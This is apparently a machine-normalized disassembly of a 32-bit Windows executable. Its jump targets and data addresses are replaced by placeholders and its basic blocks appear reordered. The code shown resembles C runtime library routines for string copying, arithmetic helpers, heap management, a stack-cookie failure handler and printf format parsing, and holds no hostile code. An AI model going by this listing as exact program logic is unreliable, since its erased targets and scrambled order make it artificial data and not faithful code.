jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_41294b
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_412a50
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_412b00
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_412b40
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_412bea
push ebp
mov ebp esp
sub esp 0x14
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_4110bb
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
push edi
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx cx [ eax ]
movzx ecx cx
movzx edx cl
inc eax
test [ edx + edi + 0x1d ] 0x4
mov [ ebp + 0x8 ] eax
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_415aa0
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
mov al [ eax ]
cmp al bl
jne r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
pop esi
cmp ax cx
jne r-xdata
mov dl [ esi ]
cmp dl bl
mov [ ebp - 0x1 ] dl
jne r-xdata
xor edx edx
inc [ ebp + 0x8 ]
mov dh cl
mov dl al
movzx ecx dx
xor ecx ecx
jmp r-xdata
pop edi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp cx bx
jne r-xdata
xor edx edx
mov dh al
inc esi
mov dl [ ebp - 0x1 ]
movzx eax dx
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_412d19
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push edi
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_411077
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
sub_412dcc
push 0x10
push r--data
call sub_4106dc
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi 0xffffffe0
jbe r-xdata
call sub_411077
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
cmp [ rw-data ] 0x3
jne r-xdata
call sub_411077
mov [ eax ] 0xc
jmp r-xdata
call sub_410721
retn
push esi
push ebx
jmp r-xdata
push 0x4
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_414275
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
cmp ebx edi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412eb2
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
cmp esi [ rw-data ]
ja r-xdata
mov eax ebx
call sub_411077
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41103c
pop ecx
mov [ esi ] eax
jmp r-xdata
mov ebx [ ebp - 0x1c ]
cmp esi edi
jne r-xdata
push esi
push ebx
push eax
call sub_41476a
add esp 0xc
test eax eax
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push [ ebp + 0x8 ]
xor esi esi
inc esi
mov [ ebp - 0x1c ] ebx
sub_412eca
push 0x10
push r--data
call sub_4106dc
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_411077
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_414275
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_410721
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412f64
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_412ff6
push esi
mov esi [ esp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ esp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_413016
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov [ ecx ] eax
xor eax eax
pop esi
retn
sub_41304d
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
sub_413089
cmp [ r--data ] 0x0
je r-xdata
call sub_41a784
push r--data
push r--data
call sub_412ff6
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
call sub_4181e2
test eax eax
pop ecx
je r-xdata
retn
push esi
push edi
push sub_4163b9
call sub_410412
mov esi r--data
mov eax esi
mov edi r--data
cmp eax edi
pop ecx
jae r-xdata
push [ esp + 0x4 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_4181e2
test eax eax
pop ecx
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_41311b
push 0xc
push r--data
call sub_4106dc
push 0x8
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ rw-data ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4131d4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] esi
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_410721
retn
mov [ rw-data ] esi
push 0x8
call sub_414124
pop ecx
push [ ebp + 0x8 ]
call sub_412fb7
push r--data
mov eax r--data
call sub_412fde
pop ecx
push [ rw-data ]
call sub_415561
mov edi eax
push [ rw-data ]
call sub_415561
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_412fde
pop ecx
sub [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x1c ] edi
jb r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call eax
jmp r-xdata
sub_413229
push esi
call sub_415558
mov esi eax
push esi
call sub_414d2c
push esi
call sub_41ab42
push esi
call sub_413ea7
push esi
call sub_41a924
push esi
call sub_41ab38
push esi
call sub_41a92e
push esi
call sub_40a33b
push esi
call sub_41722f
push sub_4131fa
call sub_4154f5
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_413280
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4132ab
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_41ac5d
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_41ac5d
pop ecx
sub_4133af
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_41b6c0
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
test al 0x82
pop ecx
jne r-xdata
test al 0x40
je r-xdata
call sub_411077
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_411077
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test al 0x10
mov [ esi + 0x4 ] ebx
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_41b545
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_41b3c7
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_41b4e7
test eax eax
pop ecx
jne r-xdata
call sub_41b545
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_41b3c7
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_41b4a3
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_41ace8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
imul eax eax 0x28
mov edx ecx
sar edx 0x5
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_41350f
push ebp
lea ebp [ esp - 0x1f8 ]
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f4 ] eax
mov eax [ ebp + 0x200 ]
push ebx
mov ebx [ ebp + 0x204 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0x20c ]
push [ ebp + 0x208 ]
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x44 ] esi
call sub_4110bb
cmp [ ebp - 0x30 ] esi
jne r-xdata
mov eax [ ebp - 0x30 ]
test [ eax + 0xc ] 0x40
jne r-xdata
call sub_411077
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
cmp ebx esi
je r-xdata
push eax
call sub_41b6c0
cmp eax 0xffffffff
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x5c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
xor ecx ecx
test dl dl
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x19 ] dl
je r-xdata
mov eax rw-data
push [ ebp - 0x30 ]
call sub_41b6c0
cmp eax 0xfffffffe
pop ecx
je r-xdata
mov ecx [ ebp + 0x1f4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
add ebp 0x1f8
leave
retn
cmp [ ebp - 0x58 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x34 ] 0x0
mov [ ebp - 0x48 ] ebx
jl r-xdata
push [ ebp - 0x30 ]
call sub_41b6c0
cmp eax 0xffffffff
pop ecx
je r-xdata
push [ ebp - 0x30 ]
call sub_41b6c0
push [ ebp - 0x30 ]
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
call sub_41b6c0
and eax 0x1f
imul eax eax 0x28
add eax [ esi ]
pop ecx
pop ecx
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ ebp - 0x5c ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax rw-data
push [ ebp - 0x30 ]
call sub_41b6c0
cmp eax 0xfffffffe
pop ecx
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
push [ ebp - 0x30 ]
call sub_41b6c0
push [ ebp - 0x30 ]
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
call sub_41b6c0
and eax 0x1f
imul eax eax 0x28
add eax [ esi ]
pop ecx
pop ecx
xor esi esi
jmp r-xdata
mov ebx [ ebp - 0x48 ]
mov al [ ebx ]
test al al
mov [ ebp - 0x19 ] al
je r-xdata
jmp [ eax * 4 + jump_table_413e87 ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
cmp eax ecx
mov [ ebp - 0x74 ] eax
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x74 ]
mov edi [ ebp - 0x2c ]
mov dl al
jmp r-xdata
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x44 ] esi
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
mov [ ebp - 0x20 ] esi
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
lea eax [ ebp - 0x64 ]
push eax
movzx eax dl
push eax
mov [ ebp - 0x44 ] esi
call sub_41b87d
pop ecx
test eax eax
mov al [ ebp - 0x19 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x18 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x40 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
cmp edi esi
mov [ ebp - 0x40 ] edi
jge r-xdata
mov eax [ ebp - 0x20 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
cmp edi esi
mov [ ebp - 0x20 ] edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x30 ]
lea esi [ ebp - 0x34 ]
call sub_4175bc
jmp r-xdata
mov ecx [ ebp - 0x30 ]
lea esi [ ebp - 0x34 ]
call sub_4175bc
mov al [ ebx ]
inc ebx
test al al
mov [ ebp - 0x48 ] ebx
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x18 ] 0x4
neg [ ebp - 0x40 ]
jmp r-xdata
or [ ebp - 0x20 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x18 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
call sub_411077
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x18 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x18 ] 0x8000
mov [ ebp - 0x48 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
call sub_413fad
add esp 0x14
cmp [ ebp - 0x58 ] 0x0
je r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x20 ] 0x8
cmp eax 0x65
jl r-xdata
test cx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x18 ] 0xffff7fff
mov [ ebp - 0x48 ] ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x18 ] 0x1000
mov [ ebp - 0x48 ] ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x18 ] 0x810
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x24 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x28 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x18 ] 0x80
mov [ ebp - 0x28 ] 0x10
je r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x4c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x18 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x18 ] 0x8
jmp r-xdata
cmp al 0x6f
je r-xdata
cmp edi esi
jne r-xdata
cmp edi esi
jne r-xdata
mov [ ebp - 0x4c ] 0x27
mov ecx [ ebp - 0x18 ]
test cx cx
jns r-xdata
mov al [ ebp - 0x4c ]
add al 0x51
mov [ ebp - 0x38 ] 0x30
mov [ ebp - 0x37 ] al
mov [ ebp - 0x3c ] 0x2
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
test al 0x40
je r-xdata
or [ ebp - 0x18 ] 0x40
cmp [ ebp - 0x20 ] esi
lea ebx [ ebp - 0x14 ]
mov eax 0x200
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x68 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test cl 0x40
mov eax [ edi - 0x4 ]
je r-xdata
test cl 0x40
mov [ ebp - 0x2c ] edi
je r-xdata
test [ ebp - 0x18 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
cmp edx esi
jg r-xdata
mov eax [ edi ]
add edi 0x4
cmp eax esi
mov [ ebp - 0x2c ] edi
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x18 ] 0x800
add dl 0x20
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x19 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x44 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
push [ ebp - 0x54 ]
call sub_40f613
and [ ebp - 0x54 ] 0x0
pop ecx
mov ebx [ ebp - 0x40 ]
sub ebx [ ebp - 0x28 ]
sub ebx [ ebp - 0x3c ]
test [ ebp - 0x18 ] 0xc
jne r-xdata
test ax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x20 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
push eax
mov ecx [ eax + 0x4 ]
cmp ecx esi
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x18 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
cmp ecx esi
jne r-xdata
cmp ecx esi
jne r-xdata
push [ ebp - 0x3c ]
mov edi [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x38 ]
call sub_417613
test [ ebp - 0x18 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push ebx
push 0x20
call sub_4175ef
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x38 ] 0x2d
jmp r-xdata
cmp [ ebp - 0x20 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x80 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x78 ]
movsx eax dl
push [ ebp - 0x20 ]
mov [ ebp - 0x2c ] edi
push eax
push [ ebp - 0x68 ]
lea eax [ ebp - 0x80 ]
push ebx
push eax
push [ rw-data ]
call sub_415561
pop ecx
call eax
mov edi [ ebp - 0x18 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x2c ] edi
call sub_41b6ed
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x18 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x20 ] eax
jle r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x18 ] 0x100
cmp eax esi
jae r-xdata
mov [ ebp - 0x28 ] eax
test [ ebp - 0x18 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x24 ] ecx
je r-xdata
